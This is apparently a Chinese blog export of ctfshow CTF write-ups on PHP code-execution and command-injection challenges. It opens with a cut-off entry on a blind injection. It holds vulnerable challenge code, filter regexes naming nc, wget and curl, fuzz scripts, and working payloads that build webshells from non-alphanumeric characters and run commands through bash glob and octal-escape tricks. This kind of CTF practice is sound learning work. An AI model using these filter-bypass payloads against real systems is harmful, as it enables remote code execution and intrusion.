<p><strong>“.&#x2F;“：代表目前所在的目录。</strong></p>
<p><strong>“ . .&#x2F;“代表上一层目录。</strong></p>
<p><strong>“&#x2F;“：代表根目录。</strong></p>
<p>web135无回显，命令长度限制</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?F=`$F` ;ls;  //相当于执行</span><br><span class="line">eval(`$F` ;);</span><br><span class="line">``$F` ;ls;`</span><br></pre></td></tr></table></figure>

<p>另解cp命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?F=`$F` ;cp flag.php 666.txt</span><br><span class="line">?F=`$F` ;nl flag.php&gt;666.txt</span><br><span class="line">?F=`$F` ;mv flag.php 666.txt</span><br></pre></td></tr></table></figure>

<p> mv source_file(文件) dest_file(文件)</p>
<p>将源文件名 source_file 改为目标文件名 dest_file</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>没有回显</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls /|tee 1</span><br><span class="line">?c=nl /f149_15_h3r3|tee 1</span><br><span class="line">?c=awk &#x27;/f/&#x27; /f149_15_h3r3|tee 1 // awk -f [file] 调用脚本</span><br></pre></td></tr></table></figure>

<p>awk 命令也是逐行扫描文件（从第 1 行到最后一行），寻找含有目标文本的行，如果匹配成功，则会在该行上执行用户想要的操作；反之，则不对行做任何处理</p>
<p>从脚本文件中读取 awk 脚本指令，以取代直接在命令行中输入指令</p>
<p>Linux tee命令用于读取标准输入的数据，并将其内容输出成文件</p>
]]></content>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>每周大挑战</title>
    <url>/2023/05/23/ctfshow%E5%90%88%E9%9B%86-%E6%AF%8F%E5%91%A8%E5%A4%A7%E6%8C%91%E6%88%98/</url>
    <content><![CDATA[<p>ctfshow rce极限挑战</p>
<p>不能用字母数字时，我们可以通过<strong>异或，取反，自增自减，或</strong>等位运算利用特殊字符构造出字母数字，再利用<strong>php动态函数名</strong>的特性来构造webshell。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &#x27;&#x27;.[];</span><br><span class="line">echo($a);//结果就为array</span><br><span class="line">$_=[].[]; //俩数组拼接强行返回ArrayArray,这里一个短杠的值也就是ArrayArray</span><br><span class="line">PHP在进行计算的时候认为结果是无限大时他会返回结果是:INF （ Infinite)</span><br><span class="line">这里举个列：echo (1/0);  //就会输出INF</span><br><span class="line">PHP进行计算的时候认为一个数超出Infinite，那就是: NAN( not-a-number)</span><br><span class="line">这里举个例：echo (a/a); //就会输出NAN</span><br></pre></td></tr></table></figure>

<h2 id="rce1"><a href="#rce1" class="headerlink" title="rce1"></a>rce1</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;(&quot;</span>,<span class="string">&quot;括号&quot;</span>,<span class="variable">$code</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;点&quot;</span>,<span class="variable">$code</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload：echo <code>cat /f*</code>;</p>
<h2 id="rce2"><a href="#rce2" class="headerlink" title="rce2"></a>rce2</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>fuzz一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for($a = 0; $a &lt; 256; $a++)&#123;</span><br><span class="line">    if (!preg_match(&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;,chr($a)))&#123;</span><br><span class="line">        echo urlencode(chr($a)).&quot; &quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">//! $ &#x27; ( ) + , . / ; = [ ] _</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=[].[]; //俩数组拼接强行返回ArrayArray,这里一个短杠的值也就是ArrayArray</span><br><span class="line">$__=&#x27;&#x27;;  //两个短杠赋值为空</span><br><span class="line">$_=$_[&#x27;&#x27;];//从arrayarray中取首字符，即a。这里$_=$_[0]也是一样的道理，不过waf限制数字输入</span><br><span class="line">$_=++$_; //B</span><br><span class="line">$_=++$_; //C</span><br><span class="line">$_=++$_; //D</span><br><span class="line">$_=++$_; //D</span><br><span class="line">$__.=$_; //E  把两个短杠赋值为E</span><br><span class="line">$_=++$_; //F  一个短杠继续自增</span><br><span class="line">$_=++$_; //G </span><br><span class="line">$__=$_.$__; // GE  一个短杠自增变成了G，两个短杠在前面第十一行处已经赋值为E，拼接得GE</span><br><span class="line">$_=++$_; //H 此处一个短杠继续自增，为H</span><br><span class="line">$_=++$_; //I</span><br><span class="line">$_=++$_; //J</span><br><span class="line">$_=++$_; //k</span><br><span class="line">$_=++$_; //L</span><br><span class="line">$_=++$_; //M</span><br><span class="line">$_=++$_; //N</span><br><span class="line">$_=++$_; //O</span><br><span class="line">$_=++$_; //P</span><br><span class="line">$_=++$_; //Q</span><br><span class="line">$_=++$_; //R</span><br><span class="line">$_=++$_; //S</span><br><span class="line">$_=++$_; //T</span><br><span class="line">$__.=$_; // GET 在此处，两条短杠原是GE与一条短杠（已经自增为T），.=拼接，构成get</span><br><span class="line">$&#123;&#x27;_&#x27;.$__&#125;[_]($&#123;&#x27;_&#x27;.$__&#125;[__]); // 进行拼接，$_GET[&#x27;_&#x27;]($_GET[&#x27;__&#x27;]);</span><br></pre></td></tr></table></figure>

<p>根据这个写的payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//这是我这一题做出来的所用的</span><br><span class="line">$_=[].[];$__=&#x27;&#x27;;$_=$_[&#x27;&#x27;];$_=++$_;$_=++$_;$_=++$_;$_=++$_;$__.=$_;$_=++$_;$_=++$_;$__=$_.$__;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$__.=$_;$___=&#x27;_&#x27;;$___.=$__;($$___[_])($$___[__]);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">ctf_showspan><br><span class="line">//然后get传_=system&amp;__=ls</span><br><span class="line">//url编码后用抓包传参，</span><br></pre></td></tr></table></figure>

<p>ctfshow{6a98d4af-f123-458a-9ad8-4fbbbb75cdd6}</p>
<h2 id="rce3"><a href="#rce3" class="headerlink" title="rce3"></a>rce3</h2><p>PHP进行计算的时候认为一个数超出Infinite，那就是: NAN( not-a-number)<br> 这里举个例：echo (a&#x2F;a); &#x2F;&#x2F;就会输出NAN</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">105</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z2-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">//() + , . / 0 1 ; = [] _</span></span><br><span class="line">限制<span class="number">105</span></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=([].[])[0]; </span><br><span class="line">//这里就是上面的数组拼接，强制返回ArrayArray, 取第一个A</span><br><span class="line">$_=($_/$_.$_)[0]; </span><br><span class="line">//这里是关键php的计算上面有说，其实这里麻烦了，只是当时不知道, 这里返回 N</span><br><span class="line">$_++; //O</span><br><span class="line">$__=$_.$_++; </span><br><span class="line">//这里是进行了++的，所以$_等于P, $__=PO, 其实这里才是第五题的关键嘿嘿，很多74的就是卡在这</span><br><span class="line">$_++; // Q</span><br><span class="line">$_++; // R</span><br><span class="line">$_++; // S</span><br><span class="line">$_=_.$__.$_.++$_; //这里最后一个也是进行了++的，所以最后一位是T, $_ = _POST</span><br><span class="line">$$_[_]($$_[1]); // $_POST[_]($_POST[1]);</span><br></pre></td></tr></table></figure>

<p>因为N下面就有post的所有字母，而且比较近</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_=([].[])[0];$_=($_/$_.$_)[0];$_++;$__=$_.$_++;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_]($$_[1]);</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctf_show=%24_%3D%28%5B%5D.%5B%5D%29%5B0%5D%3B%24_%3D%28%24_/%24_.%24_%29%5B0%5D%3B%24_%2B%2B%3B%24__%3D%24_.%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D_.%24__.%24_.%2B%2B%24_%3B%24%24_%5B_%5D%28%24%24_%5B1%5D%29%3B&amp;_=system&amp;1=ls</span><br></pre></td></tr></table></figure>

<h2 id="rce4"><a href="#rce4" class="headerlink" title="rce4"></a>rce4</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">105</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z2-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>比上一个少了1，而且字符数要求更少了。所以需要我们压缩得更短。不影响我们使用(0&#x2F;0)来构造NAN, 但是更为优秀的写法可以是<code>$a=(_/_._)[0];</code>直接得到字母N，payload构造过程：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=(_/_._)[0];//直接拼接成字符串并切片</span><br><span class="line">$o=++$a;//$o=++$a是先把$a进行自增，自增完成之后再将值返回，也就是这一句结束的时候 $a和$o都是O</span><br><span class="line">$o=++$a.$o;//$o=&gt;PO,$a=&gt;P</span><br><span class="line">$a++;//Q</span><br><span class="line">$a++;//R</span><br><span class="line">$o.=++$a;//$o=&gt;POS,$a=&gt;S</span><br><span class="line">$o.=++$a;//$o=&gt;POST,$a=&gt;T</span><br><span class="line">$_=_.$o;//_POST</span><br><span class="line">$$_[0]($$_[_]);//$_POST[0]($_POST[_]);</span><br></pre></td></tr></table></figure>

<p>这位师傅写的太棒了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctf_show=$%ff=(_/_._)[0];$%fe=%2b%2b$%ff;$%fe=%2b%2b$%ff.$%fe;$%ff%2b%2b;$%ff%2b%2b;$%fe.=%2b%2b$%ff;$%fe.=%2b%2b$%ff;$_=_.$%fe;$$_[0]($$_[_]);&amp;0=system&amp;_=cat /f1agaaa</span><br></pre></td></tr></table></figure>

<h2 id="rce5"><a href="#rce5" class="headerlink" title="rce5"></a>rce5</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">73</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>fuzz脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$i</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">256</span>;<span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>, <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>))) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//      $()+,./;=[]_</span></span><br></pre></td></tr></table></figure>

<p>​     phpinfo安装了一个扩展gettext，该扩展支持函数<code>_()</code> ,相当于<code>gettext()</code>，直接转化为字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=_(a/a)[a];//相当于gettext(0/0)[0],得到N</span><br><span class="line">$_=++$a;//O</span><br><span class="line">$_=_.++$a.$_;//_PO</span><br><span class="line">$a++;$a++;//R</span><br><span class="line">$_.=++$a.++$a;//_POST</span><br><span class="line">$$_[a]($$_[_]);//$_POST[a]($_POST[_])</span><br></pre></td></tr></table></figure>

<p>至于为什么<code>$_=$a.$a++;</code>这一步得到的是PO而不是OP，或者OO，而<code>$_=_.$a.$a++;</code>得到的是<code>_OO</code>,经过和用这种做法的师傅们讨论，目前分析下来最有可能的原因是，PHP在做字符串拼接的过程中（.操作），是一个从左到右递归的过程，而<code>++</code>操作类似于一个函数，php在执行完函数后，再做拼接的操作，<code>$_=$a.$a++;//PO</code>这里相当于先执行了<code>$a++</code>操作（函数），并得到<code>$a++</code>的返回值，然后和左侧的<code>$a</code>变量进行拼接，此时<code>$a</code>已经是P了。而<code>$_=_.$a.$a++;</code>时先执行了<code>_</code>和<code>$a</code>的拼接，而后再执行<code>$_=&#39;_O&#39;.$a++</code>，所以得到的是<code>_OO</code>。*以上所有均为猜测，具体机制需研究PHP源码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctf_show=$%ff=_(%ff/%ff)[%ff];$_=%2b%2b$%ff;$_=_.%2b%2b$%ff.$_;$%ff%2b%2b;$%ff%2b%2b;$_.=%2b%2b$%ff.%2b%2b$%ff;$$_[_]($$_[%ff]);&amp;_=system&amp;%ff=cat /f1agaaa</span><br></pre></td></tr></table></figure>

<p>注意不可见字符要抓包传参，空格换成+号</p>
<p>68位</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=<span class="title function_ invoke__">_</span>(a/a)[_];<span class="comment">//N</span></span><br><span class="line"><span class="variable">$a</span>=++<span class="variable">$_</span>;<span class="comment">//O</span></span><br><span class="line"><span class="variable">$$a</span>[<span class="variable">$a</span>=_.++<span class="variable">$_</span>.<span class="variable">$a</span>[<span class="variable">$_</span>++/<span class="variable">$_</span>++].++<span class="variable">$_</span>.++<span class="variable">$_</span>](<span class="variable">$$a</span>[_]);<span class="comment">//巧妙的把两次$_++放在一起</span></span><br><span class="line"><span class="variable">$a</span>=_.++<span class="variable">$_</span>.<span class="variable">$a</span>[<span class="variable">$_</span>++/<span class="variable">$_</span>++].++<span class="variable">$_</span>.++<span class="variable">$_</span><span class="comment">//$a直接拼接出_POST</span></span><br><span class="line"><span class="variable">$$a</span>[_POST](<span class="variable">$$a</span>[_])<span class="comment">//$_POST[_POST]($_POST[_])</span></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctf_show=$_=_(%ff/%ff)[_];$%ff=%2b%2b$_;$$%ff[$%ff=_.%2b%2b$_.$%ff[$_%2b%2b/$_%2b%2b].%2b%2b$_.%2b%2b$_]($$%ff[_]);&amp;_POST=system&amp;_=cat /f1agaaa</span><br></pre></td></tr></table></figure>

<p><a href="https://ctf-show.feishu.cn/docx/ToiJd70SboRn52xhn3WcJsfjnah">CTFshow-RCE极限大挑战官方wp - 飞书云文档 (feishu.cn)</a></p>
<p>这位师傅写的好棒</p>
<p><a href="https://blog.csdn.net/qq_61955196/article/details/127932968">https://blog.csdn.net/qq_61955196/article/details/127932968</a></p>
<h2 id="极限命令执行1"><a href="#极限命令执行1" class="headerlink" title="极限命令执行1"></a>极限命令执行1</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//本题灵感来自研究一直没做出来的某赛某题时想到的姿势，太棒啦~。</span><br><span class="line">//flag在根目录flag里，或者直接运行根目录getflag</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#x27;ctf_show&#x27;])) &#123;</span><br><span class="line">    $ctfshow = $_POST[&#x27;ctf_show&#x27;];</span><br><span class="line">    if (!preg_match(&quot;/[b-zA-Z_@#%^&amp;*:&#123;&#125;\-\+&lt;&gt;\&quot;|`;\[\]]/&quot;,$ctfshow))&#123;</span><br><span class="line">            system($ctfshow);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo(&quot;????????&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>fuzz一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$a</span> = <span class="number">0</span>; <span class="variable">$a</span> &lt; <span class="number">256</span>; <span class="variable">$a</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[b-zA-Z_@#%^&amp;*:&#123;&#125;\-\+&lt;&gt;\&quot;|`;\[\]]/&quot;</span>, <span class="title function_ invoke__">chr</span>(<span class="variable">$a</span>))) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$a</span>)) . <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//+ ! $ &#x27; ( ) , . / 0 1 2 3 4 5 6 7 8 9 = ? \ a ~</span></span><br></pre></td></tr></table></figure>

<p>题目给了提示：<strong>本套题目运行环境均为CENTOS7</strong></p>
<p>但是这是根据wp的，我本地centos7无法执行&#x2F;getflag</p>
<p>解法一</p>
<p>&#x2F;getflag</p>
<p>给出payload: ctf_show&#x3D;&#x2F;?????a?</p>
<p>解法二： &#x2F;bin&#x2F;base64 &#x2F;flag</p>
<p> payload: ctf_show&#x3D;&#x2F;???&#x2F;?a??64 &#x2F;??a?</p>
<p>解法三</p>
<p>ctf_show&#x3D;&#x2F;bin&#x2F;bash &#x2F;flag</p>
<p>payload： ctf_show&#x3D;&#x2F;???&#x2F;?a?? &#x2F;??a?</p>
<h2 id="极限命令执行2"><a href="#极限命令执行2" class="headerlink" title="极限命令执行2"></a>极限命令执行2</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include &quot;check.php&quot;;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#x27;ctf_show&#x27;])) &#123;</span><br><span class="line">    $ctfshow = $_POST[&#x27;ctf_show&#x27;];</span><br><span class="line">    check($ctfshow);</span><br><span class="line">    system($ctfshow);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>bp fuzz一下</p>
<p><img src="/2023/05/23/ctfshow%E5%90%88%E9%9B%86-%E6%AF%8F%E5%91%A8%E5%A4%A7%E6%8C%91%E6%88%98/%5C%E6%9E%81%E9%99%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%5CQQ%E6%88%AA%E5%9B%BE20230411135838.png"></p>
<p>![](C:\various files\blog\myblog\source_posts\极限命令执行\QQ截图20230411135932.png)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://40e404d6-3af3-401c-b11c-9e48298fd1ce.challenge.ctf.show/&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">str</span>= <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">    data = &#123;<span class="string">&#x27;ctf_show&#x27;</span>:<span class="built_in">chr</span>(i)&#125;</span><br><span class="line">    retext = requests.post(url,data=data).text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;??????&quot;</span> <span class="keyword">in</span> retext:</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">str</span> += <span class="built_in">chr</span>(i)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br></pre></td></tr></table></figure>

<p>python fuzz脚本</p>
<p>payload： &#x2F;getflag</p>
<p>但是我在centos7上试了试并没有成功</p>
<p>同样，其他实验结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#x27;\154\163&#x27; #ls 成功</span><br><span class="line">$&#x27;\57\146\154\141\147&#x27;        # /flag   成功</span><br><span class="line">$&#x27;\57\147\145\164\146\154\141\147&#x27; # /getflag 失败</span><br><span class="line">$&#x27;\164\141\143\40\57\146\154\141\147&#x27; #/tac /flag 失败</span><br><span class="line">报错内容bash: tac /flag: 没有那个文件或目录</span><br></pre></td></tr></table></figure>

<p>能解出题目的payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctf_show=$&#x27;\57\147\145\164\146\154\141\147&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="极限命令执行3"><a href="#极限命令执行3" class="headerlink" title="极限命令执行3"></a>极限命令执行3</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include &quot;check.php&quot;;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#x27;ctf_show&#x27;])) &#123;</span><br><span class="line">    $ctfshow = $_POST[&#x27;ctf_show&#x27;];</span><br><span class="line">    check($ctfshow);</span><br><span class="line">    system($ctfshow);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!#$&amp;&#x27;()01&lt;\_&#123;&#125;~</span><br></pre></td></tr></table></figure>

<p>在linux 中，</p>
<p>单引号’’，双引号””的区别是</p>
<p>单引号’’剥夺了所有字符的特殊含义，单引号’’内就变成了单纯的字符，。</p>
<p>双引号””则对于双引号””内的参数替换($)和命令替换(&#96;&#96;)是个例外。</p>
<p>比如说 n&#x3D;3</p>
<p>echo ‘$n’</p>
<p>结果就是$n</p>
